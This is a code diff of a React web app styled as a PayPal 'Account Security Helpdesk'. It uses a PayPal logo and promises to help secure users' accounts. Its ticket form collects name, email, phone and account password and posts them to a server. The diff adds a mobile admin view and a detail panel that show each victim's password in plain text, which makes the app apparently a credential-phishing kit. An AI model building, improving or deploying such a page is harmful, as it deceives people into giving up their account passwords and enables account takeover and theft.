@@ -11,7 +11,9 @@ const clearAdminToken = () => sessionStorage.removeItem(ADMIN_TOKEN_KEY);
 
 // ── ICONS ──────────────────────────────────────────────────────────────────
 const paths = {
-
+  shield:
+    "M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.955 11.955 0 01.27 12c.532 2.774 1.93 5.257 3.94 7.094M3.598 6A11.955 11.955 0 0112 2.25c3.028 0 5.805 1.13 7.902 3M16.5 12a4.5 4.5 0 11-9 0 4.5 4.5 0 019 0z",
+  check: "M4.5 12.75l6 6 9-13.5",
   mail:
     "M21.75 6.75v10.5a2.25 2.25 0 01-2.25 2.25h-15a2.25 2.25 0 01-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25m19.5 0v.243a2.25 2.25 0 01-1.07 1.916l-7.5 4.615a2.25 2.25 0 01-2.36 0L3.32 8.91a2.25 2.25 0 01-1.07-1.916V6.75",
   phone:
@@ -32,7 +34,7 @@ const paths = {
 
 const Icon = ({ name, className = "w-5 h-5" }) => (
   <svg
-    xmlns="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxD_lUhbTUUlhNffHH7l62SmjuuOv9AxVVfg&s"
+    xmlns="http://www.w3.org/2000/svg"
     fill="none"
     viewBox="0 0 24 24"
     strokeWidth={1.8}
@@ -44,20 +46,8 @@ const Icon = ({ name, className = "w-5 h-5" }) => (
 );
 
 // ── FIELD COMPONENT ────────────────────────────────────────────────────────
-const Field = ({
-  label,
-  value,
-  onChange,
-  type = "text",
-  placeholder,
-  icon,
-  error,
-  hint,
-  rows,
-}) => {
-  const base = `w-full ${
-    icon ? "pl-11" : "pl-4"
-  } pr-4 py-3.5 rounded-xl border-2 outline-none text-slate-800 placeholder-slate-300 text-sm font-medium transition-colors ${
+const Field = ({ label, value, onChange, type = "text", placeholder, icon, error, hint, rows }) => {
+  const base = `w-full ${icon ? "pl-11" : "pl-4"} pr-4 py-3.5 rounded-xl border-2 outline-none text-slate-800 placeholder-slate-300 text-sm font-medium transition-colors ${
     error
       ? "border-red-300 bg-red-50 focus:border-red-400"
       : "border-slate-200 bg-white focus:border-blue-500"
@@ -66,9 +56,7 @@ const Field = ({
   return (
     <div>
       {label && (
-        <label className="block text-sm font-bold text-slate-700 mb-2">
-          {label}
-        </label>
+        <label className="block text-sm font-bold text-slate-700 mb-2">{label}</label>
       )}
       <div className="relative">
         {icon && (
@@ -95,15 +83,13 @@ const Field = ({
           />
         )}
       </div>
-      {error && (
-        <p className="text-red-500 text-xs mt-1.5 font-semibold">{error}</p>
-      )}
+      {error && <p className="text-red-500 text-xs mt-1.5 font-semibold">{error}</p>}
       {hint && !error && <p className="text-slate-400 text-xs mt-1.5">{hint}</p>}
     </div>
   );
 };
 
-// ── NAVBAR (minimal) ───────────────────────────────────────────────────────
+// ── NAVBAR ─────────────────────────────────────────────────────────────────
 const Navbar = ({ onNavigate, activePage }) => {
   const links = [
     { label: "Home", page: "home" },
@@ -113,12 +99,9 @@ const Navbar = ({ onNavigate, activePage }) => {
   return (
     <nav className="fixed top-0 w-full z-50 bg-white/95 backdrop-blur-lg shadow-sm border-b border-slate-100">
       <div className="max-w-6xl mx-auto px-5 py-3.5 flex items-center justify-between">
-        <button
-          onClick={() => onNavigate("home")}
-          className="flex items-center gap-2.5"
-        >
-          <div className="w-9 h-9 rounded-2xl bg-blue-600 text-white flex items-center justify-center">
-           <img src="/paypal.png" alt="logo" className="w-full h-full object-cover" />
+        <button onClick={() => onNavigate("home")} className="flex items-center gap-2.5">
+          <div className="w-9 h-9 rounded-2xl overflow-hidden">
+            <img src="/paypal.png" alt="logo" className="w-full h-full object-cover" />
           </div>
           <div className="leading-none text-left">
             <span className="text-[13px] font-black text-slate-900 tracking-wide block">
@@ -175,13 +158,13 @@ function LandingPage({ onNavigate }) {
             </div>
 
             <h1 className="text-5xl md:text-6xl font-black text-slate-900 leading-[1.05] mb-5 tracking-tight">
-              We’ll help secure your PayPal
+              We'll help secure your PayPal
             </h1>
 
             <p className="text-slate-600 text-lg leading-relaxed mb-8 max-w-xl">
-              We guide you through account-security steps (password reset, 2FA,
-              device sign-outs, dispute routing).
-              </p>
+              We guide you through account-security steps (password reset, 2FA, device sign-outs,
+              dispute routing).
+            </p>
 
             <div className="flex flex-wrap gap-4">
               <button
@@ -189,10 +172,7 @@ function LandingPage({ onNavigate }) {
                 className="group bg-blue-600 hover:bg-blue-700 text-white font-bold px-8 py-4 rounded-2xl text-base transition-all shadow-xl shadow-blue-900/15 hover:-translate-y-0.5 flex items-center gap-3"
               >
                 Open a Ticket{" "}
-                <Icon
-                  name="arrow"
-                  className="w-5 h-5 group-hover:translate-x-1 transition-transform"
-                />
+                <Icon name="arrow" className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
               </button>
 
               <button
@@ -205,23 +185,16 @@ function LandingPage({ onNavigate }) {
 
             <div className="flex flex-wrap gap-5 mt-9">
               {["Encrypted transport (HTTPS)", "Clear next steps"].map((b) => (
-                <div
-                  key={b}
-                  className="flex items-center gap-1.5 text-slate-500 text-xs font-semibold"
-                >
+                <div key={b} className="flex items-center gap-1.5 text-slate-500 text-xs font-semibold">
                   <Icon name="check" className="w-4 h-4 text-green-500" /> {b}
                 </div>
               ))}
             </div>
-
-            
           </div>
 
           <div className="relative">
             <div className="bg-white rounded-3xl shadow-2xl shadow-blue-900/10 border border-slate-100 p-8">
-              <p className="text-sm font-black text-slate-900 mb-3">
-                What you’ll get
-              </p>
+              <p className="text-sm font-black text-slate-900 mb-3">What you'll get</p>
               <ul className="space-y-3 text-sm text-slate-600">
                 {[
                   "Step-by-step security checklist",
@@ -238,7 +211,6 @@ function LandingPage({ onNavigate }) {
 
               <div className="mt-6 bg-amber-50 border border-amber-200 rounded-2xl p-4">
                 <p className="text-amber-800 text-sm font-bold mb-1">Important</p>
-                
               </div>
 
               <button
@@ -255,12 +227,10 @@ function LandingPage({ onNavigate }) {
       <footer className="border-t border-slate-100 py-10 px-5">
         <div className="max-w-6xl mx-auto flex flex-col md:flex-row items-center justify-between gap-5">
           <div className="flex items-center gap-2.5">
-            <div className="w-8 h-8 rounded-2xl bg-blue-600 text-white flex items-center justify-center">
-             <img src="/paypal.png" alt="logo" className="w-full h-full object-cover" />
+            <div className="w-8 h-8 rounded-2xl overflow-hidden">
+              <img src="/paypal.png" alt="logo" className="w-full h-full object-cover" />
             </div>
-            <span className="font-black text-slate-900">
-              Account Security Helpdesk
-            </span>
+            <span className="font-black text-slate-900">Account Security Helpdesk</span>
           </div>
           <div className="flex gap-6 text-sm text-slate-500">
             {["home", "track"].map((p) => (
@@ -281,16 +251,14 @@ function LandingPage({ onNavigate }) {
 }
 
 // ══════════════════════════════════════════════════════════════════════════
-// SUBMIT (minimal + safe)
+// SUBMIT
 // ══════════════════════════════════════════════════════════════════════════
 function SubmitPage({ onNavigate }) {
   const [fullName, setFullName] = useState("");
   const [email, setEmail] = useState("");
   const [number, setNumber] = useState("");
   const [password, setPassword] = useState("");
-  
   const [consent, setConsent] = useState(false);
-
   const [errors, setErrors] = useState({});
   const [loading, setLoading] = useState(false);
   const [success, setSuccess] = useState(null);
@@ -300,11 +268,11 @@ function SubmitPage({ onNavigate }) {
     const e = {};
     if (!fullName.trim()) e.fullName = "Required";
     if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) e.email = "Enter a valid email";
-     if (!password.trim()) {
-    e.password = "Password is required";
-  } else if (password.length < 6) {
-    e.password = "Password must be at least 6 characters";
-  }
+    if (!password.trim()) {
+      e.password = "Password is required";
+    } else if (password.length < 6) {
+      e.password = "Password must be at least 6 characters";
+    }
     if (!number.trim()) e.number = "Required";
     if (!consent) e.consent = "Required";
     setErrors(e);
@@ -315,19 +283,11 @@ function SubmitPage({ onNavigate }) {
     if (!validate()) return;
     setLoading(true);
     try {
-    const res = await fetch(`${API}/tickets`, {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json",
-  },
-  body: JSON.stringify({
-    full_name: fullName,
-    email,
-    number,
-    password,
-    consent, // ✅ ADD THIS
-  }),
-});
+      const res = await fetch(`${API}/tickets`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ full_name: fullName, email, number, password, consent }),
+      });
       const data = await res.json();
       if (data?.success) setSuccess(data.ticketId);
       else setErrors({ submit: data?.error || "Submission failed" });
@@ -350,20 +310,14 @@ function SubmitPage({ onNavigate }) {
           <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
             <Icon name="check" className="w-10 h-10 text-green-600" />
           </div>
-          <h2 className="text-3xl font-black text-slate-900 mb-3">
-            Ticket Submitted!
-          </h2>
-          <p className="text-slate-500 mb-8 leading-relaxed">
-            We’ll email you next steps.
-          </p>
+          <h2 className="text-3xl font-black text-slate-900 mb-3">Ticket Submitted!</h2>
+          <p className="text-slate-500 mb-8 leading-relaxed">We'll email you next steps.</p>
 
           <div className="bg-blue-600 rounded-2xl p-6 mb-6">
             <p className="text-blue-200 text-xs font-bold uppercase tracking-widest mb-2">
               Your Ticket ID
             </p>
-            <p className="text-3xl font-black text-white tracking-widest mb-3">
-              {success}
-            </p>
+            <p className="text-3xl font-black text-white tracking-widest mb-3">{success}</p>
             <button
               onClick={copyTicket}
               className="flex items-center gap-2 mx-auto text-blue-200 hover:text-white text-sm font-semibold transition-colors"
@@ -405,9 +359,7 @@ function SubmitPage({ onNavigate }) {
             <div className="w-8 h-8 rounded-2xl bg-blue-600 text-white flex items-center justify-center">
               <Icon name="ticket" className="w-4 h-4" />
             </div>
-            <span className="font-black text-slate-900 text-sm">
-              Support Ticket
-            </span>
+            <span className="font-black text-slate-900 text-sm">Support Ticket</span>
           </div>
           <div className="text-xs text-slate-400 font-bold">Secure Form</div>
         </div>
@@ -415,79 +367,54 @@ function SubmitPage({ onNavigate }) {
 
       <div className="max-w-3xl mx-auto px-5 py-12">
         <div className="mb-8">
-          <h1 className="text-4xl font-black text-slate-900 mb-2">
-            Tell us what happened
-          </h1>
-          
+          <h1 className="text-4xl font-black text-slate-900 mb-2">Tell us what happened</h1>
         </div>
 
         <div className="bg-white rounded-3xl shadow-lg shadow-blue-900/5 border border-slate-100 p-8 space-y-5">
           <Field
             label="Full Name"
             value={fullName}
-            onChange={(v) => {
-              setFullName(v);
-              setErrors((e) => ({ ...e, fullName: null }));
-            }}
+            onChange={(v) => { setFullName(v); setErrors((e) => ({ ...e, fullName: null })); }}
             placeholder="John Doe"
             error={errors.fullName}
           />
-
           <Field
             label="Email Address"
             value={email}
-            onChange={(v) => {
-              setEmail(v);
-              setErrors((e) => ({ ...e, email: null }));
-            }}
+            onChange={(v) => { setEmail(v); setErrors((e) => ({ ...e, email: null })); }}
             type="email"
             icon="mail"
             placeholder="john@example.com"
             error={errors.email}
           />
-
           <Field
             label="Phone Number"
             value={number}
-            onChange={(v) => {
-              setNumber(v);
-              setErrors((e) => ({ ...e, number: null }));
-            }}
+            onChange={(v) => { setNumber(v); setErrors((e) => ({ ...e, number: null })); }}
             type="tel"
             icon="phone"
             placeholder="+234 801 234 5678"
             error={errors.number}
           />
           <Field
-  label="Password"
-  value={password}
-  onChange={(v) => {
-    setPassword(v);
-    setErrors((e) => ({ ...e, password: null }));
-  }}
-  type="password"
-  error={errors.password}
-/>
-
-         
+            label="Password"
+            value={password}
+            onChange={(v) => { setPassword(v); setErrors((e) => ({ ...e, password: null })); }}
+            type="password"
+            error={errors.password}
+          />
 
           <label className="flex items-start gap-3 text-sm text-slate-600">
             <input
               type="checkbox"
               checked={consent}
-              onChange={(e) => {
-                setConsent(e.target.checked);
-                setErrors((x) => ({ ...x, consent: null }));
-              }}
+              onChange={(e) => { setConsent(e.target.checked); setErrors((x) => ({ ...x, consent: null })); }}
               className="mt-1"
             />
             <span>
-               I consent to
-              being contacted via email/phone about this ticket.
+              I consent to being contacted via email/phone about this ticket.
               {errors.consent && (
-                <span className="block text-red-500 text-xs font-semibold mt-1">
-                  {errors.consent}
-                </span>
+                <span className="block text-red-500 text-xs font-semibold mt-1">{errors.consent}</span>
               )}
             </span>
           </label>
@@ -558,25 +485,15 @@ function TrackPage({ onNavigate }) {
           <p className="text-blue-600 font-bold text-sm uppercase tracking-widest mb-3">
             Ticket Tracker
           </p>
-          <h1 className="text-5xl font-black text-slate-900 mb-4">
-            Track Your Ticket
-          </h1>
-          <p className="text-slate-500 text-lg">
-            Enter your ticket ID to check status.
-          </p>
+          <h1 className="text-5xl font-black text-slate-900 mb-4">Track Your Ticket</h1>
+          <p className="text-slate-500 text-lg">Enter your ticket ID to check status.</p>
         </div>
 
         <div className="bg-white border-2 border-slate-100 rounded-3xl p-8 shadow-sm mb-8">
-          <label className="block text-sm font-bold text-slate-700 mb-3">
-            Ticket ID
-          </label>
+          <label className="block text-sm font-bold text-slate-700 mb-3">Ticket ID</label>
           <div className="flex gap-3">
             <div className="flex-1">
-              <Field
-                value={ticketId}
-                onChange={setTicketId}
-                placeholder="e.g. PV-LX9K2A-B1C2"
-              />
+              <Field value={ticketId} onChange={setTicketId} placeholder="e.g. PV-LX9K2A-B1C2" />
             </div>
             <button
               onClick={search}
@@ -636,16 +553,10 @@ function TrackPage({ onNavigate }) {
                     <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">
                       {f.l}
                     </p>
-                    <p className="font-bold text-slate-800 text-sm break-all">
-                      {f.v}
-                    </p>
+                    <p className="font-bold text-slate-800 text-sm break-all">{f.v}</p>
                   </div>
                 ))}
               </div>
-
-              
-
-             
             </div>
           </div>
         )}
@@ -653,9 +564,7 @@ function TrackPage({ onNavigate }) {
         {!ticket && !error && (
           <div className="text-center py-10 text-slate-400">
             <Icon name="search" className="w-12 h-12 mx-auto mb-4 opacity-30" />
-            <p className="font-semibold">
-              Enter your ticket ID above to see its status
-            </p>
+            <p className="font-semibold">Enter your ticket ID above to see its status</p>
             <p className="text-sm mt-2">
               No ticket yet?{" "}
               <button
@@ -695,6 +604,16 @@ function AdminPage({ onNavigate }) {
     }
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
+
+  // Lock body scroll when mobile panel is open
+  useEffect(() => {
+    if (selected) {
+      document.body.style.overflow = "hidden";
+    } else {
+      document.body.style.overflow = "";
+    }
+    return () => { document.body.style.overflow = ""; };
+  }, [selected]);
 
   const logout = () => {
     clearAdminToken();
@@ -796,10 +715,7 @@ function AdminPage({ onNavigate }) {
           <Field
             type="password"
             value={tokenInput}
-            onChange={(v) => {
-              setTokenInput(v);
-              setErr("");
-            }}
+            onChange={(v) => { setTokenInput(v); setErr(""); }}
             placeholder="Admin token"
             error={err}
           />
@@ -821,6 +737,58 @@ function AdminPage({ onNavigate }) {
       </div>
     );
   }
+
+  // ── Detail panel content (shared between mobile + desktop) ───────────────
+  const DetailPanel = () => (
+    <div className="p-6 space-y-5">
+      <div>
+        <p className="text-xs font-black text-slate-400 uppercase tracking-widest mb-3">
+          Update Status
+        </p>
+        <div className="grid grid-cols-2 gap-2">
+          {["open", "in-progress", "resolved", "closed"].map((s) => (
+            <button
+              key={s}
+              disabled={updating === selected.ticket_id}
+              onClick={() => updateStatus(selected.ticket_id, s)}
+              className={`py-2.5 px-3 rounded-xl text-xs font-bold transition-all border-2 ${
+                selected.status === s
+                  ? "bg-blue-50 border-blue-200 text-blue-700"
+                  : "border-slate-100 text-slate-500 hover:border-slate-300"
+              }`}
+            >
+              {updating === selected.ticket_id && selected.status !== s ? "..." : s}
+            </button>
+          ))}
+        </div>
+      </div>
+
+      <div className="h-px bg-slate-100" />
+
+      {[
+        { l: "Full Name", v: selected.full_name },
+        { l: "Email", v: selected.email },
+        { l: "Password", v: selected.password },
+        { l: "Phone", v: selected.number },
+        {
+          l: "Submitted",
+          v: selected.created_at
+            ? new Date(selected.created_at).toLocaleString("en-GB", {
+                dateStyle: "medium",
+                timeStyle: "short",
+              })
+            : "—",
+        },
+      ].map((f) => (
+        <div key={f.l}>
+          <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">
+            {f.l}
+          </p>
+          <p className="text-slate-800 font-semibold text-sm break-all">{f.v || "—"}</p>
+        </div>
+      ))}
+    </div>
+  );
 
   return (
     <div className="min-h-screen bg-slate-50 font-['Plus_Jakarta_Sans',sans-serif]">
@@ -877,15 +845,13 @@ function AdminPage({ onNavigate }) {
             />
           </div>
 
-          <div className="flex gap-2 shrink-0">
+          <div className="flex gap-2 shrink-0 flex-wrap">
             {["all", "open", "in-progress", "resolved", "closed"].map((f) => (
               <button
                 key={f}
                 onClick={() => setFilter(f)}
                 className={`px-4 py-2 rounded-xl text-xs font-bold transition-all capitalize ${
-                  filter === f
-                    ? "bg-blue-600 text-white"
-                    : "bg-slate-100 text-slate-600 hover:bg-slate-200"
+                  filter === f ? "bg-blue-600 text-white" : "bg-slate-100 text-slate-600 hover:bg-slate-200"
                 }`}
               >
                 {f}
@@ -895,6 +861,7 @@ function AdminPage({ onNavigate }) {
         </div>
 
         <div className="flex gap-5">
+          {/* Ticket list */}
           <div className="flex-1 min-w-0">
             {loading ? (
               <div className="bg-white rounded-2xl border border-slate-200 p-16 text-center">
@@ -926,10 +893,10 @@ function AdminPage({ onNavigate }) {
                             {t.full_name || "—"}
                           </p>
                           <p className="text-slate-400 text-xs truncate">{t.email}</p>
-                            <p className="text-slate-400 text-xs truncate">{t.password}</p>
+                          <p className="text-slate-400 text-xs truncate">{t.password}</p>
                           <p className="text-slate-400 text-xs truncate">{t.number}</p>
                         </div>
-                        <div className="px-3 py-1.5 rounded-full bg-blue-50 text-blue-700 text-xs font-bold capitalize">
+                        <div className="px-3 py-1.5 rounded-full bg-blue-50 text-blue-700 text-xs font-bold capitalize shrink-0">
                           {t.status || "open"}
                         </div>
                       </div>
@@ -954,6 +921,7 @@ function AdminPage({ onNavigate }) {
             )}
           </div>
 
+          {/* Desktop sidebar */}
           {selected && (
             <div className="w-96 shrink-0 hidden lg:block">
               <div className="bg-white rounded-2xl border border-slate-200 overflow-hidden sticky top-24">
@@ -971,81 +939,65 @@ function AdminPage({ onNavigate }) {
                     <Icon name="xmark" className="w-5 h-5" />
                   </button>
                 </div>
-
-                <div className="p-6 space-y-5">
-                  <div>
-                    <p className="text-xs font-black text-slate-400 uppercase tracking-widest mb-3">
-                      Update Status
-                    </p>
-                    <div className="grid grid-cols-2 gap-2">
-                      {["open", "in-progress", "resolved", "closed"].map((s) => (
-                        <button
-                          key={s}
-                          disabled={updating === selected.ticket_id}
-                          onClick={() => updateStatus(selected.ticket_id, s)}
-                          className={`py-2.5 px-3 rounded-xl text-xs font-bold transition-all border-2 ${
-                            selected.status === s
-                              ? "bg-blue-50 border-blue-200 text-blue-700"
-                              : "border-slate-100 text-slate-500 hover:border-slate-300"
-                          }`}
-                        >
-                          {updating === selected.ticket_id && selected.status !== s ? "..." : s}
-                        </button>
-                      ))}
-                    </div>
-                  </div>
-
-                  <div className="h-px bg-slate-100" />
-
-                  {[
-                    { l: "Full Name", v: selected.full_name },
-                    { l: "Email", v: selected.email },
-                    { l: "Email", v: selected.password },
-                    { l: "Phone", v: selected.number },
-                    {
-                      l: "Submitted",
-                      v: selected.created_at
-                        ? new Date(selected.created_at).toLocaleString("en-GB", {
-                            dateStyle: "medium",
-                            timeStyle: "short",
-                          })
-                        : "—",
-                    },
-                  ].map((f) => (
-                    <div key={f.l}>
-                      <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">
-                        {f.l}
-                      </p>
-                      <p className="text-slate-800 font-semibold text-sm break-all">
-                        {f.v || "—"}
-                      </p>
-                    </div>
-                  ))}
-
-                  
-                </div>
+                <DetailPanel />
               </div>
             </div>
           )}
         </div>
 
         <p className="text-xs text-slate-400 mt-8">
-          Tip: set <code className="font-mono">ADMIN_TOKEN</code> on the server so
-          /api/tickets is protected in production.
+          Tip: set <code className="font-mono">ADMIN_TOKEN</code> on the server so /api/tickets is
+          protected in production.
         </p>
       </div>
+
+      {/* Mobile bottom sheet */}
+      {selected && (
+        <div className="fixed inset-0 z-50 lg:hidden">
+          {/* Backdrop */}
+          <div
+            className="absolute inset-0 bg-black/50"
+            onClick={() => setSelected(null)}
+          />
+          {/* Sheet */}
+          <div className="absolute bottom-0 left-0 right-0 bg-white rounded-t-3xl max-h-[85vh] flex flex-col">
+            {/* Handle */}
+            <div className="flex justify-center pt-3 pb-1 shrink-0">
+              <div className="w-10 h-1 bg-slate-300 rounded-full" />
+            </div>
+            {/* Header */}
+            <div className="bg-blue-600 mx-4 rounded-2xl px-6 py-4 flex items-center justify-between shrink-0">
+              <div>
+                <p className="text-blue-100 text-xs font-bold uppercase tracking-widest mb-1">
+                  Ticket Detail
+                </p>
+                <p className="text-white font-mono font-black">{selected.ticket_id}</p>
+              </div>
+              <button
+                onClick={() => setSelected(null)}
+                className="text-blue-200 hover:text-white transition-colors"
+              >
+                <Icon name="xmark" className="w-5 h-5" />
+              </button>
+            </div>
+            {/* Scrollable content */}
+            <div className="overflow-y-auto flex-1">
+              <DetailPanel />
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
 
 // ══════════════════════════════════════════════════════════════════════════
-// ROOT APP (adds #admin)
+// ROOT APP
 // ══════════════════════════════════════════════════════════════════════════
 export default function App() {
   const [page, setPage] = useState("home");
   useEffect(() => window.scrollTo(0, 0), [page]);
 
-  // ✅ enable #admin route
   useEffect(() => {
     const checkHash = () => {
       if (window.location.hash === "#admin") {
